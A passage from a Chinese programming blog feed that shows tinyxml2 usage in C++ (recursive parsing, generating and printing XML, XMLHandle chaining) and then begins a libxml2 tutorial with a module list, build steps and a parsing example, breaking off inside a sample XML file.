<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">XMLError tinyxml2::XMLDocument::LoadFile(<span class="keyword">const</span> <span class="keyword">char</span> * filename)	</span><br><span class="line">XMLError tinyxml2::XMLDocument::LoadFile(FILE * )</span><br></pre></td></tr></table></figure>

<p>相反，tinyxml2::XMLDocument::SaveFile 可保存XML文档</p>
<p>下面的例子以解析XML文档所以节点信息</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tinyxml2.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> tinyxml2; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ParserXMLFile</span><span class="params">(<span class="keyword">int</span> &amp;depth,XMLNode *pNode)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> index=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 根节点</span></span><br><span class="line">    XMLNode *node=pNode;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="comment">// 如果是节点是元素</span></span><br><span class="line">        <span class="keyword">if</span>(node-&gt;ToElement())&#123;</span><br><span class="line">            index++;</span><br><span class="line">            XMLElement *element=node-&gt;ToElement();</span><br><span class="line">            <span class="built_in">cout</span>.<span class="built_in">width</span>(depth);</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;index&lt;&lt;<span class="string">"."</span>&lt;&lt;element-&gt;Name();</span><br><span class="line">            <span class="comment">// 获取元素的文本</span></span><br><span class="line">            <span class="keyword">if</span>(element-&gt;GetText())&#123;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="string">"--&gt;"</span>&lt;&lt;element-&gt;GetText();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="comment">// 解析属性</span></span><br><span class="line">            <span class="keyword">const</span> XMLAttribute *attribute=element-&gt;FirstAttribute();</span><br><span class="line">            <span class="keyword">bool</span> ishas_attr=<span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">if</span>(attribute) &#123;</span><br><span class="line">                ishas_attr=<span class="literal">true</span>;</span><br><span class="line">                <span class="built_in">cout</span>.<span class="built_in">width</span>(depth);</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="string">"=&gt; "</span>;</span><br><span class="line">                <span class="keyword">while</span> (attribute)&#123;</span><br><span class="line">                    <span class="built_in">cout</span>&lt;&lt;attribute-&gt;Name()&lt;&lt;<span class="string">":"</span>&lt;&lt;attribute-&gt;Value()&lt;&lt;<span class="string">" | "</span>;</span><br><span class="line">                    attribute=attribute-&gt;Next();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(ishas_attr)<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 当前节点node的下一个子节点</span></span><br><span class="line">            <span class="keyword">if</span>(node-&gt;FirstChild())&#123;</span><br><span class="line">                depth+=<span class="number">10</span>;</span><br><span class="line">                ParserXMLFile(depth,node-&gt;FirstChild());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        node=node-&gt;NextSibling();</span><br><span class="line">    &#125;<span class="keyword">while</span>(node);</span><br><span class="line">    <span class="keyword">if</span>(depth&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        depth-=<span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testParserXML</span><span class="params">()</span></span>&#123;</span><br><span class="line">    XMLDocument document;</span><br><span class="line">    XMLError xmlError;</span><br><span class="line">    <span class="keyword">if</span>((xmlError= document.LoadFile(<span class="string">"test1.xml"</span>))==XML_SUCCESS)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"Load xml file ok!"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;document.ErrorStr()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// &lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line">    <span class="keyword">if</span>(document.FirstChild()-&gt;ToDeclaration())&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;document.FirstChild()-&gt;ToDeclaration()-&gt;Value()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// &lt;!--This is a comment...--&gt;</span></span><br><span class="line">    <span class="keyword">if</span>(document.FirstChild()-&gt;NextSibling()-&gt;ToComment())&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;document.FirstChild()-&gt;NextSibling()-&gt;ToComment()-&gt;Value()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"Root Element: "</span>&lt;&lt; document.RootElement()-&gt;Name()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">int</span> depth=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 根节点下的第一个子节点</span></span><br><span class="line">    ParserXMLFile(depth,document.RootElement()-&gt;FirstChild());</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    testParserXML();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的代码是不是很熟悉？</p>
<p>test.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--This is a comment...--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Theme</span> <span class="attr">version</span>=<span class="string">"2.0"</span> <span class="attr">magnet</span>=<span class="string">"9"</span> <span class="attr">alpha</span>=<span class="string">"255"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Bitmap</span> <span class="attr">id</span>=<span class="string">"main"</span> <span class="attr">file</span>=<span class="string">"main.bmp"</span> <span class="attr">alphacolor</span>=<span class="string">"#FF0001"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Font</span> <span class="attr">id</span>=<span class="string">"playlist_font"</span> <span class="attr">file</span>=<span class="string">"FreeSansBold.ttf"</span> <span class="attr">size</span>=<span class="string">"11"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">BitmapFont</span> <span class="attr">id</span>=<span class="string">"digits_font"</span> <span class="attr">file</span>=<span class="string">"nums_ex.bmp"</span> <span class="attr">type</span>=<span class="string">"digits"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Window</span> <span class="attr">id</span>=<span class="string">"playlist_window"</span> <span class="attr">x</span>=<span class="string">"100"</span> <span class="attr">y</span>=<span class="string">"332"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Layout</span> <span class="attr">id</span>=<span class="string">"pl_small_layout"</span> <span class="attr">width</span>=<span class="string">"275"</span> <span class="attr">height</span>=<span class="string">"116"</span> <span class="attr">minwidth</span>=<span class="string">"275"</span> <span class="attr">minheight</span>=<span class="string">"116"</span> <span class="attr">maxwidth</span>=<span class="string">"1000"</span> <span class="attr">maxheight</span>=<span class="string">"800"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Group</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Text</span> <span class="attr">font</span>=<span class="string">"text_font"</span> <span class="attr">x</span>=<span class="string">"4"</span> <span class="attr">y</span>=<span class="string">"4"</span> <span class="attr">width</span>=<span class="string">"239"</span> <span class="attr">text</span>=<span class="string">"$N"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Group</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Layout</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Layout</span> <span class="attr">id</span>=<span class="string">"pl_big_layout"</span> <span class="attr">width</span>=<span class="string">"275"</span> <span class="attr">height</span>=<span class="string">"116"</span> <span class="attr">minwidth</span>=<span class="string">"275"</span> <span class="attr">minheight</span>=<span class="string">"116"</span> <span class="attr">maxwidth</span>=<span class="string">"1000"</span> <span class="attr">maxheight</span>=<span class="string">"800"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Group</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Anchor</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"116"</span> <span class="attr">priority</span>=<span class="string">"30"</span> <span class="attr">range</span>=<span class="string">"15"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Group</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Layout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Window</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Theme</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>最后的结果就不显示出来了。。。思路也很简单，通过递归获取每个子节点的信息。官网也有类文档可参考，这里就不在详细介绍了。不过有个地方的确要注意</p>
<p>const char* tinyxml2::XMLNode::Value()const</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Document:   empty (NULL is returned,not an empty string)</span><br><span class="line">Element:    name of the element</span><br><span class="line">Comment:    the comment text</span><br><span class="line">Unknown:    the tag contents</span><br><span class="line">Text:       the text string</span><br></pre></td></tr></table></figure>

<p>这是基类XMLNode的Value成员函数，而文档（Document）对象，返回确实一个 <strong>NULL</strong>，不是空字符串！文档对象是一个特殊的节点对象。</p>
<p>而生成XML则时更加简单了</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GenerateXMLFile</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename)</span></span>&#123;</span><br><span class="line">    XMLDocument document;</span><br><span class="line">    <span class="comment">// 添加 &lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line">    document.InsertFirstChild(document.NewDeclaration());</span><br><span class="line">    <span class="comment">// 添加注释</span></span><br><span class="line">    document.InsertEndChild(document.NewComment(<span class="string">"Hello World!"</span>));</span><br><span class="line">    <span class="comment">// 添加根节点</span></span><br><span class="line">    XMLElement *root= document.NewElement(<span class="string">"People"</span>);</span><br><span class="line">    document.InsertEndChild(root);</span><br><span class="line">    <span class="comment">// 添加一个新元素</span></span><br><span class="line">    XMLElement *student=document.NewElement(<span class="string">"Student"</span>);</span><br><span class="line">    <span class="comment">// 设置元素属性</span></span><br><span class="line">    student-&gt;SetAttribute(<span class="string">"name"</span>,<span class="string">"XiaoMing"</span>);</span><br><span class="line">    student-&gt;SetAttribute(<span class="string">"age"</span>,<span class="number">16</span>);</span><br><span class="line">    XMLElement *stu_0=document.NewElement(<span class="string">"Hobby"</span>);</span><br><span class="line">    stu_0-&gt;SetText(<span class="string">"Play Football"</span>);</span><br><span class="line">    <span class="comment">// 插入子节点</span></span><br><span class="line">    student-&gt;InsertFirstChild(stu_0);</span><br><span class="line">    XMLElement *teacher=document.NewElement(<span class="string">"Teacher"</span>);</span><br><span class="line">    teacher-&gt;SetText(<span class="string">"I am a teacher"</span>);</span><br><span class="line">    <span class="comment">// 删除属性</span></span><br><span class="line">    student-&gt;DeleteAttribute(<span class="string">"age"</span>);</span><br><span class="line">    root-&gt;InsertFirstChild(student);</span><br><span class="line">    root-&gt;InsertEndChild(teacher);</span><br><span class="line">    <span class="comment">// 保存文件</span></span><br><span class="line">    document.SaveFile(filename);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要打印XML文档的内容到标准输出，可以用 <strong>XMLPrinter</strong> 类，其构造函数为</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** Construct the printer. If the FILE* is specified,</span></span><br><span class="line"><span class="comment">    	this will print to the FILE. Else it will print</span></span><br><span class="line"><span class="comment">    	to memory, and the result is available in CStr().</span></span><br><span class="line"><span class="comment">    	If 'compact' is set to true, then output is created</span></span><br><span class="line"><span class="comment">    	with only required whitespace and newlines.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    XMLPrinter( FILE* file=<span class="number">0</span>, <span class="keyword">bool</span> compact = <span class="literal">false</span>, <span class="keyword">int</span> depth = <span class="number">0</span> );</span><br></pre></td></tr></table></figure>

<p>调用如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">XMLPrinter printer;</span><br><span class="line">document.Print( &amp;printer );</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;printer.CStr()&lt;&lt;<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure>

<p>关于 XMLHandle 的作用，官网也说得很清楚，假如有一下xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Document</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Element</span> <span class="attr">attributeA</span> = <span class="string">"valueA"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Child</span> <span class="attr">attributeB</span> = <span class="string">"value1"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Child</span> <span class="attr">attributeB</span> = <span class="string">"value2"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Element</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Document</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果要获取 attributeB 属性的值 “value2”，一般情况下，通过如下方法获取最终的值</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">XMLElement* root = document.FirstChildElement( <span class="string">"Document"</span> );</span><br><span class="line"><span class="keyword">if</span> ( root )</span><br><span class="line">&#123;</span><br><span class="line">    XMLElement* element = root-&gt;FirstChildElement( <span class="string">"Element"</span> );</span><br><span class="line">    <span class="keyword">if</span> ( element )</span><br><span class="line">    &#123;</span><br><span class="line">        XMLElement* child = element-&gt;FirstChildElement( <span class="string">"Child"</span> );</span><br><span class="line">        <span class="keyword">if</span> ( child )</span><br><span class="line">        &#123;</span><br><span class="line">            XMLElement* child2 = child-&gt;NextSiblingElement( <span class="string">"Child"</span> );</span><br><span class="line">            <span class="keyword">if</span> ( child2 )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// Finally do something useful.</span></span><br></pre></td></tr></table></figure>

<p>每一步都必须判断是否为空指针，这样的话代码就显得十分繁琐，<br>于是 XMLHandle 提供了这样一种方法</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">XMLHandle <span class="title">docHandle</span><span class="params">( &amp;document )</span></span>;</span><br><span class="line">XMLElement* child2 = docHandle.FirstChildElement( <span class="string">"Document"</span> ).FirstChildElement( <span class="string">"Element"</span> ).FirstChildElement().NextSiblingElement();</span><br><span class="line"><span class="keyword">if</span> ( child2 )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// do something useful</span></span><br></pre></td></tr></table></figure>

<p>这样的话，就不用每步都进行一次判断了。如果在这中间过程中返回了空指针，那么结果就是空指针，只有每一步都正确，结果才正确。</p>
<p>思考以下代码，看看那个代码写法正确？</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(document.FirstChildElement(<span class="string">"notPeople"</span>)-&gt;FirstChildElement(<span class="string">"Student"</span>))&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;document.FirstChildElement(<span class="string">"People"</span>)-&gt;FirstChildElement(<span class="string">"Student"</span>)-&gt;Value()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">XMLHandle <span class="title">handle</span><span class="params">(&amp;document)</span></span>; </span><br><span class="line"> <span class="keyword">if</span>(handle.FirstChildElement(<span class="string">"notPeople"</span>).FirstChildElement(<span class="string">"Student"</span>).ToElement())&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;document.FirstChildElement(<span class="string">"People"</span>)-&gt;FirstChildElement(<span class="string">"Student"</span>)-&gt;Value()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Bye~</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Libxml2解析XML文件</title>
    <url>/linux-libxml2/</url>
    <content><![CDATA[<p>Libxml2是由C语言开发的一个库，除了解析XML文档外，还可以解析HTML文档（不过这我没有研究）。同时，libxml2库可移植于多个平台<br>大致可与运行在如下平台： Linux, Unix, Windows, CygWin, MacOS, MacOS X, RISC Os, OS/2, VMS, QNX, MVS, VxWorks</p>
<a id="more"></a>

<p>可以从官网： <a href="http://xmlsoft.org" target="_blank" rel="noopener">http://xmlsoft.org</a> 获取最新版本（2.9.8）的libxml2库。Linux下编译也很简单<br>./configure<br>make<br>make install</p>
<p>官网上也有一些例子，以及API接口文档，常见问题，Tutorial，建议去看看。也可以从下载的源文件目录doc中离线浏览</p>
<p>libxml2库囊括了以下的模块，</p>
<h4 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h4><p><strong>DOCBparser</strong>: old DocBook SGML parser<br><strong>HTMLparser</strong>: interface for an HTML 4.0 non-verifying parser<br><strong>HTMLtree</strong>: specific APIs to process HTML tree, especially serialization<br><strong>SAX</strong>: Old SAX version 1 handler, deprecated<br><strong>SAX2</strong>: SAX2 parser interface used to build the DOM tree<br><strong>c14n</strong>: Provide Canonical XML and Exclusive XML Canonicalization<br><strong>catalog</strong>: interfaces to the Catalog handling system<br><strong>chvalid</strong>: Unicode character range checking<br><strong>debugXML</strong>: Tree debugging APIs<br><strong>dict</strong>: string dictionary<br><strong>encoding</strong>: interface for the encoding conversion functions<br><strong>entities</strong>: interface for the XML entities handling<br><strong>globals</strong>: interface for all global variables of the library<br><strong>hash</strong>: Chained hash tables<br><strong>list</strong>: lists interfaces<br><strong>nanoftp</strong>: minimal FTP implementation<br><strong>nanohttp</strong>: minimal HTTP implementation<br><strong>parser</strong>: the core parser module<br><strong>parserInternals</strong>: internals routines and limits exported by the parser.<br><strong>pattern</strong>: pattern expression handling<br><strong>relaxng</strong>: implementation of the Relax-NG validation<br><strong>schemasInternals</strong>: internal interfaces for XML Schemas<br><strong>schematron</strong>: XML Schemastron implementation<br><strong>threads</strong>: interfaces for thread handling<br><strong>tree</strong>: interfaces for tree manipulation<br><strong>uri</strong>: library of generic URI related routines<br><strong>valid</strong>: The DTD validation<br><strong>xinclude</strong>: implementation of XInclude<br><strong>xlink</strong>: unfinished XLink detection module<br><strong>xmlIO</strong>: interface for the I/O interfaces used by the parser<br><strong>xmlautomata</strong>: API to build regexp automata<br><strong>xmlerror</strong>: error handling<br><strong>xmlexports</strong>: macros for marking symbols as exportable/importable.<br><strong>xmlmemory</strong>: interface for the memory allocator<br><strong>xmlmodule</strong>: dynamic module loading<br><strong>xmlreader</strong>: the XMLReader implementation<br><strong>xmlregexp</strong>: regular expressions handling<br><strong>xmlsave</strong>: the XML document serializer<br><strong>xmlschemas</strong>: incomplete XML Schemas structure implementation<br><strong>xmlschemastypes</strong>: implementation of XML Schema Datatypes<br><strong>xmlstring</strong>: set of routines to process strings<br><strong>xmlunicode</strong>: Unicode character APIs<br><strong>xmlversion</strong>: compile-time version informations<br><strong>xmlwriter</strong>: text writing API for XML<br><strong>xpath</strong>: XML Path Language implementation<br><strong>xpathInternals</strong>: internal interfaces for XML Path Language implementation<br><strong>xpointer</strong>: API to handle XML Pointers</p>
<p>因为libxml2包含大量函数，实现有不同的方式。这里介绍一些常用的。至于其他的功能有兴趣自己研究吧……<br>而这里主要用到的为 parser，tree，xmlreader，xmlwriter 这几个模块</p>
<h3 id="parser-tree"><a href="#parser-tree" class="headerlink" title="parser/tree"></a>parser/tree</h3><h4 id="读取XML文档"><a href="#读取XML文档" class="headerlink" title="读取XML文档"></a>读取XML文档</h4><p>首先介绍xml文档的解析吧，大致调用函数如下</p>
<ul>
<li>xmlReadFile/xmlParseFile 打开一个XML文档并返回一个文档对象指针xmlDocPtr</li>
<li>xmlDocGetRootElement 获取XML文档的根节点xmlNodePtr</li>
<li>获取根节点，以及childNode的名称、属性名/值。而这一步骤可以通过递归实现。</li>
<li>最后由 xmlFreeDoc、xmlCleanupParser 释放所有分配的内存</li>
</ul>
<p>下面给出一个例子（C++）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libxml/parser.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libxml/tree.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// \param depth  递归深度</span></span><br><span class="line"><span class="comment">/// \param _xmlNodePtr 节点对象指针</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ParserXML</span><span class="params">(<span class="keyword">int</span> &amp;depth,xmlNodePtr _xmlNodePtr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> ishas_child=<span class="literal">false</span>;</span><br><span class="line">    <span class="comment">// 所有子节点</span></span><br><span class="line">    xmlNodePtr xmlNodePtr1= _xmlNodePtr-&gt;children;</span><br><span class="line">    <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (xmlNodePtr1)&#123;</span><br><span class="line">        <span class="comment">// 判断节点类型</span></span><br><span class="line">        <span class="keyword">if</span>(xmlNodePtr1-&gt;type!=XML_TEXT_NODE)&#123;</span><br><span class="line">        <span class="comment">// xmlStrcmp(xmlNodePtr1-&gt;name,BAD_CAST "text")</span></span><br><span class="line">            count++;</span><br><span class="line">            <span class="comment">// 子节点个数</span></span><br><span class="line">            <span class="keyword">int</span> childEleCount= xmlChildElementCount(xmlNodePtr1);</span><br><span class="line">            <span class="built_in">cout</span>.<span class="built_in">width</span>(depth);</span><br><span class="line">            <span class="keyword">if</span>(childEleCount==<span class="number">0</span>)&#123;</span><br><span class="line">                ishas_child=<span class="literal">false</span>;</span><br><span class="line">                <span class="comment">// 表明无子节点</span></span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;count&lt;&lt;<span class="string">"."</span>&lt;&lt;xmlNodePtr1-&gt;name&lt;&lt;<span class="string">" --&gt; "</span>&lt;&lt;xmlNodeGetContent(xmlNodePtr1)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                ishas_child=<span class="literal">true</span>;</span><br><span class="line">                <span class="comment">// 表明有子节点</span></span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;count&lt;&lt;<span class="string">"."</span>&lt;&lt;xmlNodePtr1-&gt;name&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 遍历节点属性</span></span><br><span class="line">            xmlAttr* xmlAttr1=xmlNodePtr1-&gt;properties;</span><br><span class="line">            <span class="keyword">if</span>(xmlAttr1)&#123;</span><br><span class="line">                <span class="built_in">cout</span>.<span class="built_in">width</span>(depth+<span class="number">1</span>);</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="string">"=&gt;"</span>;</span><br><span class="line">                <span class="keyword">while</span> (xmlAttr1!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">                    <span class="comment">// 判断使用存在属性 ， xmlGetProp获取属性值</span></span><br><span class="line">                    <span class="keyword">if</span>(xmlHasProp(xmlNodePtr1,xmlAttr1-&gt;name))&#123;</span><br><span class="line">                        <span class="built_in">cout</span>&lt;&lt;<span class="string">" "</span>&lt;&lt;xmlAttr1-&gt;name&lt;&lt;<span class="string">":"</span>&lt;&lt;</span><br><span class="line">                            xmlGetProp(xmlNodePtr1,xmlAttr1-&gt;name);</span><br><span class="line">                    &#125;</span><br><span class="line">                    xmlAttr1=xmlAttr1-&gt;next;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 递归调用</span></span><br><span class="line">            <span class="keyword">if</span>(ishas_child)&#123;</span><br><span class="line">                depth+=<span class="number">10</span>;</span><br><span class="line">                ParserXML(depth,xmlNodePtr1);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        xmlNodePtr1=xmlNodePtr1-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(depth&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        depth-=<span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    xmlDocPtr xmlDocPtr1=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//xmlDocPtr1=xmlParseFile(argv[1]);</span></span><br><span class="line">    xmlInitParser();</span><br><span class="line">    <span class="comment">// 读取文件</span></span><br><span class="line">    xmlDocPtr1=xmlReadFile(argv[<span class="number">1</span>],<span class="string">"UTF-8"</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(xmlDocPtr1==<span class="literal">NULL</span>) &#123;</span><br><span class="line">        xmlErrorPtr xmlErrorPtr1 =xmlGetLastError();</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; xmlErrorPtr1-&gt;message &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"Version: "</span>&lt;&lt;xmlDocPtr1-&gt;version&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"Encoding: "</span>&lt;&lt;xmlDocPtr1-&gt;encoding&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// 获取根节点</span></span><br><span class="line">    xmlNodePtr xmlNodePtr1= xmlDocGetRootElement(xmlDocPtr1);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"Root Element: "</span>&lt;&lt;xmlNodePtr1-&gt;name&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// 遍历所有信息</span></span><br><span class="line">    <span class="keyword">int</span> depth=<span class="number">0</span>;</span><br><span class="line">    ParserXML(depth,xmlNodePtr1);</span><br><span class="line">    <span class="comment">// 释放内存</span></span><br><span class="line">    xmlFreeDoc(xmlDocPtr1);</span><br><span class="line">    xmlCleanupParser();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有如下 test.xml 文档</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">People</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Student</span> <span class="attr">id</span>=<span class="string">"0x00000000"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jack<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">age</span>&gt;</span>14<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sex</span>&gt;</span>Man<span class="tag">&lt;/<span class="name">sex</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hobby</span>&gt;</span>Computer Programming<span class="tag">&lt;/<span class="name">hobby</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Student</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Student</span> <span class="attr">id</span>=<span class="string">"0x11111111"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>Tony<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">age</span>&gt;</span>17<span class="tag">&lt;/<span 